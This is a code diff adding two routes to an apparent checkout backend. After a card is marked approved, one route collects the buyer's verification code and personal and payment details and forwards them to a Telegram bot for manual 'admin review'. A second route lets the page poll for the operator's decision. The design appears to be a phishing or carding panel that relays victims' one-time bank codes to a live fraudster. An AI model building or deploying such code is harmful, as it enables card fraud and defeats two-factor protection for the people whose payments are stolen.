@@ -171,4 +171,74 @@ router.get('/approval/:sessionId', (req, res) => {
   }
 });
 
+// POST /api/checkout/submit-code
+// Submit verification code for admin review
+router.post('/submit-code', async (req, res) => {
+  try {
+    const { sessionId, code, userName, userEmail, productName, amount, paymentMethod, installments, phoneMasked } = req.body;
+
+    if (!sessionId || !code) {
+      return res.status(400).json({ error: 'sessionId and code are required' });
+    }
+
+    // Check if session exists and is approved
+    const record = approvalStore.getRecord(sessionId);
+    if (!record) {
+      return res.status(404).json({ error: 'Session not found or expired' });
+    }
+
+    if (record.status !== 'approved') {
+      return res.status(400).json({ error: 'Card not yet approved' });
+    }
+
+    // Check if already verifying
+    if (record.status === 'verifying') {
+      return res.status(409).json({ error: 'Verification already in progress' });
+    }
+
+    // Set verification code and status to verifying
+    approvalStore.setVerificationCode(sessionId, code);
+
+    // Send Telegram notification with 4 buttons
+    telegramService.sendCodeVerificationRequest({
+      sessionId,
+      userName: userName || record.meta?.userName,
+      userEmail: userEmail || record.meta?.userEmail,
+      productName: productName || record.meta?.productName,
+      amount: amount || record.meta?.amount,
+      paymentMethod: paymentMethod || record.meta?.paymentMethod,
+      installments: installments || record.meta?.installments,
+      phoneMasked: phoneMasked || record.meta?.phoneMasked,
+    }, code).catch((err) => {
+      console.error('[CheckoutCode] Telegram notification failed:', err.message);
+    });
+
+    return res.status(202).json({ success: true, message: 'Verification code submitted' });
+  } catch (err) {
+    console.error('[CheckoutCode] Error:', err);
+    return res.status(500).json({ error: 'Internal server error' });
+  }
+});
+
+// GET /api/checkout/verification-result/:sessionId
+// Get verification result for polling
+router.get('/verification-result/:sessionId', (req, res) => {
+  try {
+    const { sessionId } = req.params;
+    const record = approvalStore.getRecord(sessionId);
+
+    if (!record) {
+      return res.status(404).json({ error: 'Session not found or expired' });
+    }
+
+    return res.json({
+      status: record.status,
+      verificationResult: record.verificationResult,
+    });
+  } catch (err) {
+    console.error('[CheckoutVerification] Error:', err);
+    return res.status(500).json({ error: 'Internal server error' });
+  }
+});
+
 module.exports = router;
